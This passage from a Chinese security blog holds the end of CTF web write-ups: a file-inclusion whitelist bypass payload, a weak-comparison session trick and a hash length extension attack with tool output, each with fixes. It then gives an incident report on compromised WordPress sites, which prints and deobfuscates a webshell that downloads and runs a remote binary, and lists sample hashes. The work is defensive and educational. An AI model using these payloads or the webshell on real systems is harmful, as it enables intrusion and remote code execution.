it</h2><p>打开题目</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563019511983.png" alt="1563019511983"></p><p>查看下源代码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563019528128.png" alt="1563019528128"></p><p>注释掉了一个名为<code>source</code>的<code>php</code>文件，访问下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563019564987.png" alt="1563019564987"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"aa"</span>=&gt;<span class="string">"aa.php"</span>];<span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;<span class="comment">//判断是否传递了page参数</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">//判断page是否在白名单里</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );<span class="comment">//进行问号截取</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );<span class="comment">//出问题的代码</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; kind::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];<span class="comment">//文件包含</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源代码显示是文件包含类型的，想要利用需要满足3个条件</p><ol><li><code>file</code>参数不为空</li><li><code>file</code>参数是字符串</li><li>通过<code>kind</code>类中的<code>checkFile</code>方法</li></ol><p>所以用%253f（二次URL解码后是<code>?</code>）就可以绕过了，PAYLOAD：<code>file=source.php%253f/../flag.php</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563020120782.png" alt="1563020120782"></p><p>查看源代码是</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563020138445.png" alt="1563020138445"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>猜密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">session_start();</span></span><br><span class="line"><span class="comment">$_SESSION['pwd']=time();</span></span><br><span class="line"><span class="comment">if (isset ($_POST['password'])) &#123;</span></span><br><span class="line"><span class="comment">if ($_POST['pwd'] == $_SESSION['pwd'])</span></span><br><span class="line"><span class="comment">die('Flag:'.$flag);</span></span><br><span class="line"><span class="comment">else&#123;</span></span><br><span class="line"><span class="comment">print '&lt;p&gt;猜测错误.&lt;/p&gt;';</span></span><br><span class="line"><span class="comment">$_SESSION['pwd']=time().time();</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"猜密码"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果<code>post</code>的<code>pwd</code>等于当前的时间的时间戳，就返回<code>flag</code>,尝试过提前预判时间，发现不可以，就只能直接入手题目了，这里用到了一个弱比较，来进行一个空比较，<code>session ID</code>是我们可控的，<code>pwd</code>也是我们可控的，唯一就是<code>session</code>我们无法控制是多少，但是可以置为空，所以直接<code>post</code>空的<code>pwd</code>过去就可以了（这是<code>fix</code>后的）</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563020450719.png" alt="1563020450719"></p><h2 id="Fix-it-1"><a href="#Fix-it-1" class="headerlink" title="Fix it"></a>Fix it</h2><ol><li>可参考phpmyadmin官方的修复方式</li><li><code>die(&#39;Flag:&#39;.$flag);</code>-&gt;<code>die(&#39;Flag:NOPE&#39;);</code></li></ol><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><h2 id="Break-it-1"><a href="#Break-it-1" class="headerlink" title="Break it"></a>Break it</h2><p>打开是个卫星控制系统，要日卫星？</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563443581056.png" alt="1563443581056"></p><p>查看下<code>robots.txt</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563443609590.png" alt="1563443609590"></p><p>访问看看</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563443626224.png" alt="1563443626224"></p><p>登录时抓包，发现有段<code>hash_key</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563443679265.png" alt="1563443679265"></p><p>猜测是<code>md5</code>后的值，探测下目录</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563443766952.png" alt="1563443766952"></p><p>发现了<code>License.txt</code></p><p>访问后发现了部分源代码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563443803943.png" alt="1563443803943"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxxx_just_a_sample_xxxxxxx&#125;"</span>;</span><br><span class="line">$bisskey = <span class="string">"xxxxxxxxx_just_a_sample_xxxxxxx"</span>; <span class="comment">// To remember Easily, 10 chars allowed.</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">header(<span class="string">"hash_key:"</span> . $hash_key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"MyIdentity"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin123"</span> &amp;&amp; urldecode($password) != <span class="string">"admin123"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">"MyIdentity"</span>] === md5($bisskey . urldecode($username .$password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Great! You win!\n"</span>;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">"&lt;!-- Y0ur f!4g 1s here "</span>. $flag . <span class="string">"--&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"I don't konw what you say!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"I don't konw what you say!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"hash_key"</span>, md5($bisskey . urldecode(<span class="string">"admin123"</span> . <span class="string">"admin123"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));<span class="comment">//hashkey算法</span></span><br></pre></td></tr></table></figure><p>其中<code>hash_key</code>算法为<code>$bisskey（长度10的字符串）</code>与url解码后的<code>admin123admin123</code>相连接后进行<code>md5</code>加密，爆破是不可能爆破了，查阅资料后发现可以用哈希扩展攻击，构造payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;hash_extender# .&#x2F;hash_extender --data admin123admin123 --secret 10 --append ciscn --signature e7187cb49ce6d5958d279284af968254 --format md5</span><br><span class="line">Type: md5</span><br><span class="line">Secret length: 10</span><br><span class="line">New signature: c862a00ecfd776d1907b30da639431e7</span><br><span class="line">New string: 61646d696e31323361646d696e313233800000000000000000000000000000000000000000000000000000000000d000000000000000636973636e</span><br></pre></td></tr></table></figure><p>替换<code>MyIdentify</code>和<code>password</code>后即可获得<code>flag</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563445111368.png" alt="1563445111368"></p><h2 id="Fix-it-2"><a href="#Fix-it-2" class="headerlink" title="Fix it"></a>Fix it</h2><p>改掉<code>bisskey</code>的值</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5W WordPress站点被shell事件调查报告</title>
      <link href="/p/bf2f.html"/>
      <url>/p/bf2f.html</url>
      
        <content type="html"><![CDATA[<h1 id="情报来源"><a href="#情报来源" class="headerlink" title="情报来源"></a>情报来源</h1><p>该情报来源：<a href="https://www.v2ex.com/t/588483" target="_blank" rel="noopener">https://www.v2ex.com/t/588483</a></p><a id="more"></a><p><img src= "/img/loading.gif" data-lazy-src="/images/1565014686427.png" alt="1565014686427"></p><h1 id="事件跟进"><a href="#事件跟进" class="headerlink" title="事件跟进"></a>事件跟进</h1><p>随后笔者联系到了几个.cn域名的站长，获取了相关挂马文件、安装的插件和访客日志</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565016259980.png" alt="某站长的插件列表"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565017422416.png" alt="某站长的插件列表"></p><p>简单比对后发现插件耦合度为0，基本排除了插件漏洞的可能性</p><p>从其中一个站长获取的挂马文件（名称<code>wp************.php</code>）如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">goto</span> M0cHaak; AfBuVvu: <span class="keyword">echo</span> <span class="string">"\x61\165\x78\x36\x54\150\145\x69\157\x47\x68\165\x65\121\165\x33"</span>; <span class="keyword">goto</span> DzfJmKX; XxMXe8C: $CZMkFQn = <span class="string">"\x2e\57&#123;$i_9JllM&#125;\x20\76\40\57\x64\x65\166\x2f\x6e\165\x6c\x6c\40\62\76\x2f\x64\x65\166\x2f\x6e\165\154\154\40\46"</span>; <span class="keyword">goto</span> b11TDzU; Nd2oZhY: exec(<span class="string">"\160\x6b\151\x6c\x6c\40\x2d\146\x20\55\71\x20\x73\164\x65\x61\x6c\164\150"</span>); <span class="keyword">goto</span> NQ4Z7pj; ei5Z2lV: exec(<span class="string">"\x70\x6b\x69\154\154\x20\x2d\x39\40\x2d\146\x20\163\164\x65\x61\154\164\150"</span>); <span class="keyword">goto</span> Nd2oZhY; NQ4Z7pj: $Ece5IMX = file_get_contents(trim($y8D2O23)); <span class="keyword">goto</span> QZ3ISTs; K_oNc7z: $i_9JllM = substr(str_shuffle(str_repeat($vCzdB62 = <span class="string">"\60\x31\62\x33\64\65\x36\x37\70\x39\141\142\143\x64\x65\146\x67\150\151\x6a\153\x6c\x6d\156\157\160\161\162\163\164\165\166\x77\170\171\172\x41\x42\x43\104\x45\106\x47\x48\111\x4a\113\114\x4d\x4e\x4f\120\x51\x52\x53\124\x55\x56\127\x58\131\x5a"</span>, ceil(<span class="number">6</span> / strlen($vCzdB62)))), <span class="number">1</span>, <span class="number">6</span>); <span class="keyword">goto</span> Df2R9FE; YJNB5pb: <span class="keyword">if</span> (<span class="keyword">empty</span>($y8D2O23)) &#123; <span class="keyword">goto</span> oN2Xre3; &#125; <span class="keyword">goto</span> A855UcY; Df2R9FE: $y8D2O23 = $_POST[<span class="string">"\x75\x72\154"</span>]; <span class="keyword">goto</span> YJNB5pb; q0tKzX2: M9DD3TQ: <span class="keyword">goto</span> TkvKp3I; M0cHaak: error_reporting(<span class="number">0</span>); <span class="keyword">goto</span> oMEdveg; TkvKp3I: <span class="keyword">if</span> (!($_POST[<span class="string">"\143\160"</span>] == <span class="string">"\144\157\x77\x6e\x6c\x6f\x61\144"</span>)) &#123; <span class="keyword">goto</span> GKPX8hb; &#125; <span class="keyword">goto</span> K_oNc7z; L6Aig08: <span class="keyword">echo</span> <span class="string">"\157\x6b"</span>; <span class="keyword">goto</span> CAEUef_; rEPw0Y1: chmod($i_9JllM, <span class="number">0755</span>); <span class="keyword">goto</span> XxMXe8C; A855UcY: @unlink($i_9JllM); <span class="keyword">goto</span> ei5Z2lV; DzfJmKX: <span class="keyword">die</span>; <span class="keyword">goto</span> q0tKzX2; CAEUef_: oN2Xre3: <span class="keyword">goto</span> oTXs2sI; b11TDzU: exec($CZMkFQn); <span class="keyword">goto</span> L6Aig08; oMEdveg: <span class="keyword">if</span> (!($_GET[<span class="string">"\x63\147"</span>] == <span class="string">"\x63\x68\x6b"</span>)) &#123; <span class="keyword">goto</span> M9DD3TQ; &#125; <span class="keyword">goto</span> AfBuVvu; QZ3ISTs: file_put_contents($i_9JllM, $Ece5IMX); <span class="keyword">goto</span> rEPw0Y1; oTXs2sI: GKPX8hb:</span><br></pre></td></tr></table></figure><p>解码+格式化后</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">goto</span> M0cHaak; </span><br><span class="line">AfBuVvu: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"aux6TheioGhueQu3"</span>; </span><br><span class="line"><span class="keyword">goto</span> DzfJmKX; </span><br><span class="line">XxMXe8C: </span><br><span class="line">$CZMkFQn = <span class="string">"./&#123;$i_9JllM&#125; &gt; /dev/null 2&gt;/dev/null &amp;"</span>; </span><br><span class="line"><span class="keyword">goto</span> b11TDzU; </span><br><span class="line">Nd2oZhY: </span><br><span class="line">exec(<span class="string">"pkill -f -9 stealth"</span>); </span><br><span class="line"><span class="keyword">goto</span> NQ4Z7pj; </span><br><span class="line">ei5Z2lV: </span><br><span class="line">exec(<span class="string">"pkill -9 -f stealth"</span>); </span><br><span class="line"><span class="keyword">goto</span> Nd2oZhY; </span><br><span class="line">NQ4Z7pj: </span><br><span class="line">$Ece5IMX = file_get_contents(trim($y8D2O23)); </span><br><span class="line"><span class="keyword">goto</span> QZ3ISTs; </span><br><span class="line">K_oNc7z: </span><br><span class="line">$i_9JllM = substr(str_shuffle(str_repeat($vCzdB62 = <span class="string">"4789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>, ceil(<span class="number">6</span> / strlen($vCzdB62)))), <span class="number">1</span>, <span class="number">6</span>); </span><br><span class="line"><span class="keyword">goto</span> Df2R9FE; </span><br><span class="line">YJNB5pb: </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($y8D2O23)) &#123; <span class="keyword">goto</span> oN2Xre3; </span><br><span class="line">&#125; <span class="keyword">goto</span> A855UcY; </span><br><span class="line">Df2R9FE: </span><br><span class="line">$y8D2O23 = $_POST[<span class="string">"url"</span>]; </span><br><span class="line"><span class="keyword">goto</span> YJNB5pb; </span><br><span class="line">q0tKzX2: </span><br><span class="line">M9DD3TQ: </span><br><span class="line"><span class="keyword">goto</span> TkvKp3I; </span><br><span class="line">M0cHaak: </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">goto</span> oMEdveg; </span><br><span class="line">TkvKp3I: </span><br><span class="line"><span class="keyword">if</span> (!($_POST[<span class="string">"cp"</span>] == <span class="string">"download"</span>)) &#123; </span><br><span class="line"><span class="keyword">goto</span> GKPX8hb; </span><br><span class="line">&#125; <span class="keyword">goto</span> K_oNc7z; </span><br><span class="line">L6Aig08: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ok"</span>; </span><br><span class="line"><span class="keyword">goto</span> CAEUef_; </span><br><span class="line">rEPw0Y1: </span><br><span class="line">chmod($i_9JllM, <span class="number">0755</span>); </span><br><span class="line"><span class="keyword">goto</span> XxMXe8C; </span><br><span class="line">A855UcY: </span><br><span class="line">@unlink($i_9JllM); </span><br><span class="line"><span class="keyword">goto</span> ei5Z2lV; </span><br><span class="line">DzfJmKX: </span><br><span class="line"><span class="keyword">die</span>; </span><br><span class="line"><span class="keyword">goto</span> q0tKzX2; </span><br><span class="line">CAEUef_: </span><br><span class="line">oN2Xre3: </span><br><span class="line"><span class="keyword">goto</span> oTXs2sI; </span><br><span class="line">b11TDzU: </span><br><span class="line">exec($CZMkFQn); </span><br><span class="line"><span class="keyword">goto</span> L6Aig08; </span><br><span class="line">oMEdveg: </span><br><span class="line"><span class="keyword">if</span> (!($_GET[<span class="string">"cg"</span>] == <span class="string">"chk"</span>)) &#123; </span><br><span class="line"><span class="keyword">goto</span> M9DD3TQ; </span><br><span class="line">&#125; <span class="keyword">goto</span> AfBuVvu; </span><br><span class="line">QZ3ISTs: </span><br><span class="line">file_put_contents($i_9JllM, $Ece5IMX); </span><br><span class="line"><span class="keyword">goto</span> rEPw0Y1; </span><br><span class="line">oTXs2sI: </span><br><span class="line">GKPX8hb:</span><br></pre></td></tr></table></figure><p>整理后</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">goto</span> Fun1; </span><br><span class="line">Fun2: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"aux6TheioGhueQu3"</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun3; </span><br><span class="line">Fun4: </span><br><span class="line">$Var1 = <span class="string">"./&#123;$Var4&#125; &gt; /dev/null 2&gt;/dev/null &amp;"</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun5; </span><br><span class="line">Fun6: </span><br><span class="line">exec(<span class="string">"pkill -f -9 stealth"</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun7; </span><br><span class="line">Fun8: </span><br><span class="line">exec(<span class="string">"pkill -9 -f stealth"</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun6; </span><br><span class="line">Fun7: </span><br><span class="line">$Var2 = file_get_contents(trim($Var3)); </span><br><span class="line"><span class="keyword">goto</span> Fun9; </span><br><span class="line">Fun10: </span><br><span class="line">$Var4 = substr(str_shuffle(str_repeat($Var5 = <span class="string">"4789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>, ceil(<span class="number">6</span> / strlen($Var5)))), <span class="number">1</span>, <span class="number">6</span>); <span class="comment">//从4789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ中随机取6位</span></span><br><span class="line"><span class="keyword">goto</span> Fun11; </span><br><span class="line">Fun12: </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($Var3)) &#123; <span class="keyword">goto</span> Fun13; </span><br><span class="line">&#125; <span class="keyword">goto</span> Fun14; </span><br><span class="line">Fun11: </span><br><span class="line">$Var3 = $_POST[<span class="string">"url"</span>]; </span><br><span class="line"><span class="keyword">goto</span> Fun12; </span><br><span class="line">Fun15: </span><br><span class="line">Fun16: </span><br><span class="line"><span class="keyword">goto</span> Fun17; </span><br><span class="line">Fun1: </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun18; </span><br><span class="line">Fun17: </span><br><span class="line"><span class="keyword">if</span> (!($_POST[<span class="string">"cp"</span>] == <span class="string">"download"</span>)) &#123; </span><br><span class="line"><span class="keyword">goto</span> Fun19; </span><br><span class="line">&#125; <span class="keyword">goto</span> Fun10; </span><br><span class="line">Fun20: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ok"</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun21; </span><br><span class="line">Fun22: </span><br><span class="line">chmod($Var4, <span class="number">0755</span>); </span><br><span class="line"><span class="keyword">goto</span> Fun4; </span><br><span class="line">Fun14: </span><br><span class="line">@unlink($Var4); </span><br><span class="line"><span class="keyword">goto</span> Fun8; </span><br><span class="line">Fun3: </span><br><span class="line"><span class="keyword">die</span>; </span><br><span class="line"><span class="keyword">goto</span> Fun15; </span><br><span class="line">Fun21: </span><br><span class="line">Fun13: </span><br><span class="line"><span class="keyword">goto</span> Fun23; </span><br><span class="line">Fun5: </span><br><span class="line">exec($Var1); </span><br><span class="line"><span class="keyword">goto</span> Fun20; </span><br><span class="line">Fun18: </span><br><span class="line"><span class="keyword">if</span> (!($_GET[<span class="string">"cg"</span>] == <span class="string">"chk"</span>)) &#123;</span><br><span class="line"><span class="keyword">goto</span> Fun16; </span><br><span class="line">&#125; <span class="keyword">goto</span> Fun2; </span><br><span class="line">Fun9: </span><br><span class="line">file_put_contents($Var4, $Var2); </span><br><span class="line"><span class="keyword">goto</span> Fun22; </span><br><span class="line">Fun23: </span><br><span class="line">Fun19:</span><br></pre></td></tr></table></figure><p>其中样本经过<a href="https://github.com/pk-fr/yakpro-po处理，混淆后大量使用了`goto`语句，PHP官方对`goto`语句解释" target="_blank" rel="noopener">https://github.com/pk-fr/yakpro-po处理，混淆后大量使用了`goto`语句，PHP官方对`goto`语句解释</a></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565014857676.png" alt="1565014857676"></p><p>有了这个基础，来看看原始文件和使用<code>yakpro-po</code>混淆后的文件</p><p>原始<code>Demo</code>文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*--------------------------</span></span><br><span class="line"><span class="comment">    simple test program !</span></span><br><span class="line"><span class="comment">---------------------------*/</span></span><br><span class="line">$hello      = <span class="string">"hello "</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">7</span>;++$i)        <span class="comment">// small loop!</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> $hello;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"that's it!"</span>.PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>混淆后的文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*   __________________________________________________</span></span><br><span class="line"><span class="comment">    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.4   |</span></span><br><span class="line"><span class="comment">    |              on 2019-08-05 18:22:28              |</span></span><br><span class="line"><span class="comment">    |    GitHub: https://github.com/pk-fr/yakpro-po    |</span></span><br><span class="line"><span class="comment">    |__________________________________________________|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">goto</span> tls4K; </span><br><span class="line">go5h2: </span><br><span class="line"><span class="keyword">echo</span> $Z6cLw; </span><br><span class="line"><span class="keyword">goto</span> rBcTy; </span><br><span class="line">uT0G7: </span><br><span class="line">Chb8G: </span><br><span class="line"><span class="keyword">goto</span> HtPK4; </span><br><span class="line">rBcTy: </span><br><span class="line">XtlH5: </span><br><span class="line"><span class="keyword">goto</span> t2u1n; </span><br><span class="line">L_cdb: </span><br><span class="line">BMnIK: </span><br><span class="line"><span class="keyword">goto</span> X6z_F; </span><br><span class="line">tls4K: </span><br><span class="line">$Z6cLw = <span class="string">"\150\x65\x6c\x6c\157\40"</span>;  <span class="comment">//hello</span></span><br><span class="line"><span class="keyword">goto</span> BvTDb; </span><br><span class="line">qvC_1: </span><br><span class="line"><span class="keyword">goto</span> BMnIK; </span><br><span class="line"><span class="keyword">goto</span> uT0G7; </span><br><span class="line">t2u1n: </span><br><span class="line">++$m3Yq8; </span><br><span class="line"><span class="keyword">goto</span> qvC_1; </span><br><span class="line">X6z_F: </span><br><span class="line"><span class="keyword">if</span> (!($m3Yq8 &lt;= <span class="number">7</span>)) &#123;  </span><br><span class="line">        <span class="keyword">goto</span> Chb8G; </span><br><span class="line">&#125; <span class="keyword">goto</span> go5h2; </span><br><span class="line">BvTDb: </span><br><span class="line">$m3Yq8 = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">goto</span> L_cdb; </span><br><span class="line">HtPK4: </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\164\150\x61\x74\47\x73\40\x69\164\x21"</span> . PHP_EOL; <span class="comment">//echo "that's it!".PHP_EOL;</span></span><br></pre></td></tr></table></figure><p>该<code>Demo</code>混淆后的文件执行的流程图如下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565024518593.png" alt="1565024518593"></p><p>那么被混淆的样本文件执行的流程图如下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/%E7%BB%98%E5%9B%BE1.png" alt=""></p><p>当接收到<code>GET</code>的参数<code>cg</code>并且<code>cg</code>的值为<code>chk</code>时，如果同时有<code>POST</code>参数<code>url</code>时，可以从远端下载一个二进制文件（即使为图片）并重命名后执行，这点与日志中所反馈的情况一致</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148235384.png" alt="1565148235384"></p><p>由于在日志中发现了大量的疑似爆破的痕迹</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148486664.png" alt="1565148486664"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148501999.png" alt="1565148501999"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148525563.png" alt="1565148525563"></p><p>笔者随后询问了几个站长站点口令情况</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148403217.png" alt="第一位站长"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148461484.png" alt="第二位站长"></p><p>以及一位朋友那边反馈的情况</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148568776.png" alt="1565148568776"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565148580167.png" alt="1565148580167"></p><p>大致推断出本次攻击事件使用手法为<code>爆破WP帐号密码</code>和<code>Nday</code>组合的复合攻击形式，该团伙资产众多，仅查到的<code>C2</code>不止2台，扫爆服务器更是遍布全球。</p><h1 id="附-IOC-amp-部分样本Hash"><a href="#附-IOC-amp-部分样本Hash" class="headerlink" title="附 IOC &amp; 部分样本Hash"></a>附 IOC &amp; 部分样本Hash</h1><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><table><thead><tr><th align="center">#</th><th align="center">文件名</th><th align="center">Hash(Sha1)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">admin.php</td><td align="center">410F10A1984F482BBAD896ECF36B02C8C635A068</td></tr><tr><td align="center">2</td><td align="center">class-wc-tracker.php</td><td align="center">6332BD9649B62ED089598F65B5790E09C547BEDA</td></tr><tr><td align="center">3</td><td align="center">qgmlxvbi.php</td><td align="center">50E6B4C9B5F7FB1CBF537EA7E4A79D5AEAEC05A9</td></tr><tr><td align="center">4</td><td align="center">single-product.php</td><td align="center">6332BD9649B62ED089598F65B5790E09C547BEDA</td></tr><tr><td align="center">5</td><td align="center">SSL.php</td><td align="center">9B139D147F70A578E45DCC9F5EB15DE349CA5FF7</td></tr><tr><td align="center">6</td><td align="center">wp-201905zgepd_oddsd.php</td><td align="center">DD0542AEF7272B8BABBFF82613738C9CA27FE6AF</td></tr><tr><td align="center">7</td><td align="center">wp-mail.php</td><td align="center">EF7F87C5F4FCB47FD69A6380D06A2B5DE276C68D</td></tr><tr><td align="center">8</td><td align="center">wp-image-edit.php</td><td align="center">2D273F89B9EC9AE356FD96142EE5DCF6A75DAB6F</td></tr></tbody></table><h2 id="IOC-【爆破】"><a 